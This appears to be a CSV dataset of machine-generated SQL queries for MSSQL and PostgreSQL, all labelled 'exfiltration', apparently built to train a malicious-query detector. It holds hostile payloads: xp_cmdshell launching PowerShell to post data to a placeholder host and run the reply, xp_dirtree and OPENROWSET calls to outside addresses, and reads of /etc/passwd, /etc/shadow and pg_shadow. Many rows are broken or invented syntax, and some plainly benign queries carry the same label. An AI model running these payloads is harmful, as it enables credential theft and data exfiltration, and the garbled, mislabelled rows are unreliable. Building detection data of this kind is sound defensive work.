query,label,label_name,source
"DECLARE @xml XML; SET @xml = (SELECT * FROM OPENROWSET('SQLNCLI', 'Server=(local);Trusted_Connection=yes;', 'SELECT 1')); EXEC xp_dirtree 'c:\\', 0, 1, 1, @xml OUT;",4,exfiltration,generated_groq_mssql_advanced
"WITH cte AS (SELECT * FROM INFORMATION_SCHEMA.TABLES) SELECT * INTO cte2 FROM cte WHERE TABLE_NAME LIKE '%openrowset%'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''MOLB1'',''EXEC sp_mssqlversion'')');",4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree 'http://[target ip]/', 0, 1, 1, NULL OUT; EXEC ('EXEC master..xp_cmdshell ''powershell -command Invoke-WebRequest -Uri http://[target ip]/ -Method Post -Body {0} -Headers @{{''Content-Type'' = ''text/plain''}} -UseBasicParsing | Invoke-Expression'' -args (''SELECT * FROM [table]''))",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'linkedserv', 'SQL Server', 'MSASQL', '('); EXEC ('INSERT INTO [linkedserv]..[dbo].[table] SELECT * FROM [table]'",4,exfiltration,generated_groq_mssql_advanced
"WITH RECURSIVE cte AS (SELECT *, 0 AS LEVEL FROM [table] UNION ALL SELECT t1.*, LEVEL + 1 FROM [table] t2 INNER JOIN cte t1 ON t2.parentid = t1.id) SELECT * FROM cte ORDER BY LEVEL; EXEC ('OPENROWSET(''SQLOLEDB'', ''[local machine]='', ''SELECT * FROM cte'')');",4,exfiltration,generated_groq_mssql_advanced
"DROP TABLE IF EXISTS #results; SELECT * INTO #results FROM OPENROWSET('SQLNCLI', 'Server=(local);Trusted_Connection=yes;', 'SELECT * FROM [table]');",4,exfiltration,generated_groq_mssql_advanced
"BULK INSERT #results FROM 'C:\\temp\\file.txt' WITH (FORMAT = 'CSV', FIRSTROW=2); EXEC ('INSERT INTO [table] SELECT * FROM #results');",4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree 'c:\\', 0, 1, 1, NULL OUT; EXEC ('DECLARE @xml XML = (SELECT * FROM OPENROWSET(''SQLNCLI'',''Server=(local);Trusted_Connection=yes;'',''SELECT * FROM [table]'')); INSERT INTO [table] EXEC (''SELECT * FROM @xml'');",4,exfiltration,generated_groq_mssql_advanced
"(SELECT * FROM [table]) FOR XML PATH; EXEC ('INSERT INTO [table] SELECT * FROM OPENXML(1, ''/root'', 2) FROM @xml');",4,exfiltration,generated_groq_mssql_advanced
"DECLARE @xml XML; SET @xml = (SELECT * FROM [table]) FOR XML AUTO; EXEC xp_dirtree 'http://[target ip]/', 0, 1, 1, @xml OUT;",4,exfiltration,generated_groq_mssql_advanced
"EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'', ''[local machine]='', ''SELECT * FROM [table]'')'); EXEC xp_dirtree 'c:\\', 0, 1, 1, NULL OUT;",4,exfiltration,generated_groq_mssql_advanced
"SELECT * INTO #results FROM [table]; BULK INSERT #results FROM 'C:\\temp\\file.txt' WITH (FORMAT = 'CSV', FIRSTROW=2);",4,exfiltration,generated_groq_mssql_advanced
"WITH cte AS (SELECT * FROM [table]) SELECT * INTO cte2 FROM cte WHERE column LIKE '%[target ip]%'; EXEC ('INSERT INTO cte2 SELECT * FROM OPENROWSET(''SQLNCLI'',''Server=(local);Trusted_Connection=yes;'',''SELECT * FROM cte'')');",4,exfiltration,generated_groq_mssql_advanced
"SELECT * FROM [table]; EXEC ('INSERT INTO [table] EXEC (''SELECT * FROM OPENROWSET(''SQLOLEDB'', ''[local machine]='', ''SELECT * FROM cte'')'')');",4,exfiltration,generated_groq_mssql_advanced
"EXEC ('INSERT INTO [table] EXEC (''INSERT INTO [table] EXEC (''SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=(local);Trusted_Connection=yes;'',''SELECT * FROM cte'')'')'')');",4,exfiltration,generated_groq_mssql_advanced
"WITH cte AS (SELECT * FROM [table]) SELECT * INTO cte2 FROM cte WHERE column LIKE '%[target ip]%'; EXEC ('INSERT INTO cte2 EXEC (''OPENROWSET(''SQLOLEDB'', ''[local machine]='', ''SELECT * FROM cte'')'')');",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'linkedserv', 'SQL Server', 'MSASQL', '('); EXEC ('INSERT INTO [linkedserv]..[dbo].[table] (SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=(local);Trusted_Connection=yes;'',''SELECT * FROM cte''))');",4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree 'c:\\', 0, 1, 1, NULL OUT; EXEC ('INSERT INTO [table] EXEC (''SELECT * FROM OPENXML(1, ''/root'', 2) FROM @xml'');",4,exfiltration,generated_groq_mssql_advanced
"(SELECT * FROM [table]) FOR XML PATH; EXEC xp_dirtree 'http://[target ip]/', 0, 1, 1, NULL OUT;",4,exfiltration,generated_groq_mssql_advanced
" DECLARE @xml xml; SET @xml = ( SELECT DISTINCT 'example' AS tag FROM sys.tables FOR XML PATH('') ); exec xp_dirtree 'C:\', 1, 1, @xml; ",4,exfiltration,generated_groq_mssql_advanced
"OPENROWSET('MJOLNIR','http://10.0.0.1:80', 'SELECT top 1 * FROM sys.tables'); ",4,exfiltration,generated_groq_mssql_advanced
" DECLARE @r nvarchar(max); SET @r = ( SELECT STRING_AGG(name, ',','') WITHIN GROUP (ORDER BY name) FROM sys.tables ); exec xp_dirtree 'C:\', 1, 1, @r; ",4,exfiltration,generated_groq_mssql_advanced
" EXEC ('declare @sql nvarchar(max); set @sql= ''SELECT * INTO #temp FROM OPENROWSET(''MJOLNIR'',''http://10.0.0.1:80'',''SELECT top 10 * FROM sys.tables''); exec sp_executesql @sql' ); ",4,exfiltration,generated_groq_mssql_advanced
" DECLARE @xml xml; SET @xml = ( SELECT name FROM sys.tables ); exec msdb.dbo.xp_dirtree 'C:\', 1, 1, @xml; ",4,exfiltration,generated_groq_mssql_advanced
"EXEC('OPENROWSET(''MJOLNIR'',''http://10.0.0.1:80'',''SELECT top 10 * FROM sys.tables'')').name; ",4,exfiltration,generated_groq_mssql_advanced
"DECLARE @xml xml; SET @xml = ( SELECT DISTINCT name FROM sys.tables FOR XML PATH('') ); exec msdb.dbo.xp_dirtree 'C:\', 1, 1, @xml; ",4,exfiltration,generated_groq_mssql_advanced
" OPENROWSET('MJOLNIR','http://10.0.0.1:80','SELECT ''test'' as result').result; ",4,exfiltration,generated_groq_mssql_advanced
"DECLARE @t table (name nvarchar(max)); INSERT INTO @t SELECT name FROM sys.tables; OPENROWSET('MJOLNIR','http://10.0.0.1:80', ('SELECT top 10 * FROM @t')); ",4,exfiltration,generated_groq_mssql_advanced
"DECLARE @xml xml; SET @xml = ( SELECT sys.tables.name FROM sys.tables ); exec xp_dirtree 'C:\', 1, 1, @xml; ",4,exfiltration,generated_groq_mssql_advanced
" OPENROWSET('MJOLNIR','http://10.0.0.1:80',('SELECT top 5 * FROM sys.tables')); ",4,exfiltration,generated_groq_mssql_advanced
 EXEC ('DECLARE @sql nvarchar(max); SET @sql = ''SELECT top 5 * FROM sys.tables INTO #temp; SELECT * FROM #temp; DROP TABLE #temp;''; EXEC sp_executesql @sql'); ,4,exfiltration,generated_groq_mssql_advanced
" DECLARE @t table (name nvarchar(max)); INSERT INTO @t SELECT name FROM sys.tables; EXEC ('SELECT top 10 * FROM #t; DROP TABLE #t;', N'@t nvarchar(max) = ''INSERT INTO #t SELECT name FROM sys.tables'') ",4,exfiltration,generated_groq_mssql_advanced
"DECLARE @t table (name nvarchar(max)); INSERT INTO @t SELECT name FROM sys.tables; OPENROWSET('MJOLNIR','http://10.0.0.1:80', ('SELECT top 10 * FROM #t FOR XML AUTO; DROP TABLE #t;', N'@t nvarchar(max) = ''SELECT * INTO #t FROM sys.tables'')); ",4,exfiltration,generated_groq_mssql_advanced
"INSERT INTO OPENROWSET('SQLOLEDB','MSDAIPP','format file=D:\file.txt;default dir=D:\', 'SELECT * FROM INFORMATION_SCHEMA.TABLES')",4,exfiltration,generated_groq_mssql_advanced
"EXEC SP_OACREATE 'MSXML2.XMLHTTP' @ Clarkson = 1,",4,exfiltration,generated_groq_mssql_advanced
"OPENROWSET('SQLOLEDB','MSDAQP','SELECT * FROM OPENROWSET('SQLOLEDB','','SELECT * FROM INFORMATION_SCHEMA.TABLES'))",4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree '\\*\D$\file.txt','C:\file.txt',1",4,exfiltration,generated_groq_mssql_advanced
WITH ExfilCTE AS (SELECT CAST(CAST(CAST(CAST(Servers.ServerName AS VARCHAR(Max)) + SERVERPROPERTY('MachineName') + '\\,4,exfiltration,generated_groq_mssql_advanced
"FOR XML PATH('') SELECT * FROM  ((OPENROWSET('SQLOLEDB','SQLOLEDB','EXEC xp_dirtree ''\\*\D$\file.txt',''') )) AS X",4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree '\\*\D$\file.txt','','',2",4,exfiltration,generated_groq_mssql_advanced
"SELECT * FROM  OPENROWSET('SQLOLEDB','MSDAQP','format file=D:\file.txt;default dir=D:\')",4,exfiltration,generated_groq_mssql_advanced
EXEC master..xp_dirtree 'c:\\';,4,exfiltration,generated_groq_mssql_advanced
"EXEC xp_dirtree 'c:\\','c:\\\\','*',1,1,0,0,0;",4,exfiltration,generated_groq_mssql_advanced
BULK INSERT #tmp FROM 'http://testsite.com/datafile';,4,exfiltration,generated_groq_mssql_advanced
"SELECT * FROM OPENROWSET('SQLNCLI', 'Server=(localhost);Trusted_Connection=yes;', 'SELECT * FROM information_schema.columns');",4,exfiltration,generated_groq_mssql_advanced
"declare @t nvarchar(max)='SELECT * FROM OPENROWSET(''MySQL'', ''host=localhost;user=root;password=root;'', ''SELECT * FROM users'')';EXEC sp_executesql @t;",4,exfiltration,generated_groq_mssql_advanced
"WITH CTE AS (SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Excel 12.0;Database=C:\\file.xlsx', 'SELECT * FROM [Sheet1$]')) SELECT * FROM CTE;",4,exfiltration,generated_groq_mssql_advanced
"declare @xml xml = (SELECT * FROM OPENROWSET('SQLOLEDB', 'DBQ=C:\file.csv;DRIVER=Microsoft Text Driver (*.txt;*.csv);DefaultDir=C:\', 'SELECT * FROM [dbo].[mytable] FOR XML PATH(''row'')')); select @xml;",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'MyServer', 'SQL2008', 'SQLOLEDB', 'remotehost'; EXEC ('SELECT * FROM MyServer..mydatabase.dbo.myschema.mymodule');",4,exfiltration,generated_groq_mssql_advanced
"declare @sql nvarchar(max) = 'BULK INSERT #tmp FROM ''C:\file.txt'' WITH FIRSTROW=2,CHECK_CONSTRAINTS,FIRSTROW_ONLY,FIELDTERMINATOR=''; EXEC sp_executesql @sql;",4,exfiltration,generated_groq_mssql_advanced
"EXEC sp_addlinkedserver 'MyServer', 'SQLOLEDB', 'SQLOLEDB', 'remotehost'; SELECT data FROM OPENROWSET('SQLOLEDB', 'server=remotehost', 'mydatabase.dbo.mytable');",4,exfiltration,generated_groq_mssql_advanced
"SELECT * FROM (SELECT * FROM OPENROWSET('SQLOLEDB', 'server=remotehost', 'mydatabase.dbo.mytable' FOR XML PATH('')) FOR XML PATH('')) FOR XML PATH('root')",4,exfiltration,generated_groq_mssql_advanced
COPY users TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
pg_read_file('path/to/file'),4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM users,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM (SELECT x FROM pg_shadow WHERE x IS NOT NULL) x(99999),4,exfiltration,generated_groq_postgresql_simple
SELECT pg_catalog.pg_size_pretty(pg_total_relation_size('users')),4,exfiltration,generated_groq_postgresql_simple
"SELECT string_agg(oid, ' ' FROM pg_user LIMIT 10000)",4,exfiltration,generated_groq_postgresql_simple
"SELECT 'SELECT * FROM public.users ' || string_agg(oid, ' UNION SELECT * FROM public.users ' FROM pg_user LIMIT 10000)",4,exfiltration,generated_groq_postgresql_simple
"SELECT array_agg(oid::text, 1) FROM pg_user LIMIT 10000",4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM users WHERE x=x,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM users WHERE FALSE,4,exfiltration,generated_groq_postgresql_simple
SELECT dblink_connect('host=localhost port=5432 dbname=mydb user=myuser password=mypassword'); SELECT * FROM users,4,exfiltration,generated_groq_postgresql_simple
SELECT pg_read_file('/etc/passwd'),4,exfiltration,generated_groq_postgresql_simple
COPY products TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY orders TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY customers TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY employees TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY orders TO '/tmp/data',4,exfiltration,generated_groq_postgresql_simple
INSERT INTO orders SELECT * FROM orders,4,exfiltration,generated_groq_postgresql_simple
COPY orders SELECT * FROM orders,4,exfiltration,generated_groq_postgresql_simple
pg_read_file('/etc/passwords'),4,exfiltration,generated_groq_postgresql_simple
pg_read_file('/etc/hosts'),4,exfiltration,generated_groq_postgresql_simple
pg_read_file('/etc/hostname'),4,exfiltration,generated_groq_postgresql_simple
SELECT username FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
SELECT usename FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_settings,4,exfiltration,generated_groq_postgresql_simple
SELECT name FROM pg_settings,4,exfiltration,generated_groq_postgresql_simple
SELECT version FROM pg_settings,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_locks,4,exfiltration,generated_groq_postgresql_simple
SELECT datname FROM pg_database,4,exfiltration,generated_groq_postgresql_simple
SELECT user FROM pg_user,4,exfiltration,generated_groq_postgresql_simple
SELECT setting FROM pg_settings WHERE category='Client Connection',4,exfiltration,generated_groq_postgresql_simple
SELECT pg_read_file('/etc/passwd'); SELECT 'exfiltrated';,4,exfiltration,generated_groq_postgresql_simple
"COPY users TO 'C:/Users/user/Downloads/',",4,exfiltration,generated_groq_postgresql_simple
"COPY users TO '/private/insecure/',",4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow UNION SELECT 'EXFILTRATED',4,exfiltration,generated_groq_postgresql_simple
COPY users TO '/tmp/out' UNION SELECT 'EXFILTRATED',4,exfiltration,generated_groq_postgresql_simple
"COPY users TO '/tmp/insecure/, pg_read_file('/etc/passwd')",4,exfiltration,generated_groq_postgresql_simple
COPY pg_shadow TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
"COPY pg_shadow TO '/private/insecure/',",4,exfiltration,generated_groq_postgresql_simple
"COPY pg_shadow TO 'C:/Users/user/Downloads/',",4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow WHERE 1=1--,4,exfiltration,generated_groq_postgresql_simple
COPY dblink_connect('host=localhost user=admin password=pass') TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
"COPY dblink_stream_receive_to_fd('SELECT * FROM users', 0) TO '/tmp/out'",4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT * FROM users) TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT * FROM users WHERE 1=0) TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT * FROM users) UNION ALL SELECT 'EXFILTRATED' TO '/tmp/out',4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT 'exfiltrated') TO '/tmp/out;',4,exfiltration,generated_groq_postgresql_simple
"COPY (SELECT * FROM pg_shadow) TO '/private/insecure/, pg_read_file('/etc/passwd')",4,exfiltration,generated_groq_postgresql_simple
"SELECT dblink_stream_receive_to_fd('SELECT * FROM dblink_connect()', 0);",4,exfiltration,generated_groq_postgresql_simple
"SELECT dblink_stream_receive_to_fd('SELECT '' || pg_read_file(/etc/passwd) FROM pg_shadow', 0),",4,exfiltration,generated_groq_postgresql_simple
"SELECT dblink_stream_receive_to_fd(''' || pg_read_file(/etc/passwd)),",4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT '' || pg_read_file(/etc/passwd) FROM pg_shadow) TO '/tmp/out;,4,exfiltration,generated_groq_postgresql_simple
"SELECT dblink_stream_receive_to_fd('pg_backup.tar', 0, '/private/insecure')",4,exfiltration,generated_groq_postgresql_simple
"COPY users TO '/tmp/insecure/, dblink_stream_receive_to_fd('users',0)",4,exfiltration,generated_groq_postgresql_simple
COPY users TO '/tmp/out' WITH CSV HEADER,4,exfiltration,generated_groq_postgresql_simple
"SELECT * FROM dblink('localhost:5432/user1', 'SELECT * FROM pg_shadow')",4,exfiltration,generated_groq_postgresql_simple
UNION SELECT * FROM pg_shadow; COMMIT;,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow WHERE FALSE,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow UNION SELECT * FROM users,4,exfiltration,generated_groq_postgresql_simple
INSERT INTO users SELECT * FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
COPY users TO '/tmp/out'; SELECT * FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_read_file('path/to/secret/file');,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_read_file('/etc/passwd');,4,exfiltration,generated_groq_postgresql_simple
"SELECT * FROM dblink('localhost:5432/user1', 'SELECT * FROM users');",4,exfiltration,generated_groq_postgresql_simple
SELECT pg_shadow.* FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
SELECT users.* FROM users,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM users UNION ALL SELECT * FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
"INSERT INTO users SELECT * FROM dblink('localhost:5432/user1', 'SELECT * FROM pg_shadow');",4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_read_file('/tmp/secret');,4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_read_file('path/to/secret/secret_file.txt');,4,exfiltration,generated_groq_postgresql_simple
COPY /var/lib/pgsql/data/global.conf TO '/tmp/1.out',4,exfiltration,generated_groq_postgresql_simple
COPY users TO STDOUT; COPY /tmp/.bashrc TO '/tmp/2.out',4,exfiltration,generated_groq_postgresql_simple
SELECT pg_read_file('/etc/shadow');,4,exfiltration,generated_groq_postgresql_simple
INSERT INTO pg_shadow SELECT * FROM pg_shadow,4,exfiltration,generated_groq_postgresql_simple
"SELECT * FROM dblink('host=localhost user=postgres password=mypassword dbname=mydatabase','SELECT * FROM users');",4,exfiltration,generated_groq_postgresql_simple
SELECT * FROM pg_shadow WHERE id=0 UNION ALL SELECT * FROM pg_shadow WHERE id=1,4,exfiltration,generated_groq_postgresql_simple
SELECT pg_read_file('/var/log/auth.log');,4,exfiltration,generated_groq_postgresql_simple
COPY (SELECT pg_shadow.usename FROM pg_shadow WHERE pg_shadow.usesysid = (SELECT pg_shadow.usesysid FROM pg_shadow WHERE pg_shadow.usename = 'postgres')) TO '/tmp/out',4,exfiltration,generated_groq_postgresql_advanced
"COPY (SELECT * FROM (SELECT * FROM pg_shadow) t1(usesysid int, usename varchar(100), passwd varchar(100)) WHERE usesysid = (SELECT (regexp_matches((SELECT pg_read_file('/etc/passwd')),'[a-zA-Z0-9]+'))[1])) TO '/tmp/out'",4,exfiltration,generated_groq_postgresql_advanced
"SELECT * FROM (SELECT (SELECT (SELECT pg_read_file('/etc/passwd'))::json->'users'->0->>'name') as name FROM dblink('host=127.0.0.1 dbname=tmp user=postgres password=postgres','SELECT 1')) AS t1;",4,exfiltration,generated_groq_postgresql_advanced
WITH data AS (SELECT * FROM pg_shadow) SELECT * FROM data WHERE usesysid = (SELECT usesysid FROM data WHERE usename = (SELECT md5_random()) ),4,exfiltration,generated_groq_postgresql_advanced
"SELECT * FROM (SELECT * FROM (SELECT * FROM pg_shadow) t1(usesysid int, usename varchar(100))) WHERE (SELECT pg_read_file('/etc/shadow')) LIKE (SELECT usename FROM t1)t1.usename",4,exfiltration,generated_groq_postgresql_advanced
COPY (SELECT * FROM (SELECT (SELECT (SELECT pg_read_file('/proc/self/environ'))::text) AS e) s) TO '/tmp/out',4,exfiltration,generated_groq_postgresql_advanced
"WITH t1 AS (SELECT usename FROM pg_shadow) SELECT * FROM pg_shadow WHERE usesysid = (SELECT usesysid FROM t1 WHERE usename = (SELECT substring(pg_read_file('/etc/sudoers'),1,100)))",4,exfiltration,generated_groq_postgresql_advanced
WITH t1 AS (SELECT * FROM pg_shadow) SELECT * FROM t1 WHERE usename = (SELECT (SELECT pg_read_file('/etc/mtab'))::text[1]),4,exfiltration,generated_groq_postgresql_advanced
SELECT * FROM (SELECT (SELECT pg_read_file('/etc/group'))::json->'groups' ) AS t1;,4,exfiltration,generated_groq_postgresql_advanced
SELECT * FROM (SELECT (SELECT pg_read_file('/etc/passwd'))::json->'users' ) AS t1;,4,exfiltration,generated_groq_postgresql_advanced
"SELECT (SELECT (SELECT pg_read_file('/etc/sudoers'))::text) AS e FROM dblink('host=127.0.0.1 dbname=tmp user=postgres password=postgres','SELECT 1');",4,exfiltration,generated_groq_postgresql_advanced
(SELECT pg_read_file('/etc/group')) LIKE (SELECT (SELECT pg_read_file('/etc/group'))::text),4,exfiltration,generated_groq_postgresql_advanced
SELECT * FROM (SELECT (SELECT pg_read_file('/etc/sudoers'))::json->'host_specified_groups') AS t1;,4,exfiltration,generated_groq_postgresql_advanced
